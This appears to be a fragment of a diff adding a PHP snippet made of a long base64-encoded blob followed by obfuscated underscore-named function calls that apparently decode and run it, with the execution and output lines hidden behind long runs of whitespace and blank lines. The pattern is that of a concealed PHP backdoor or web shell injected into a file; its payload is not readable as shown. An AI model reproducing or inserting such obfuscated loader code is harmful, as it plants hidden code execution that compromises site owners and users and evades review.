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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
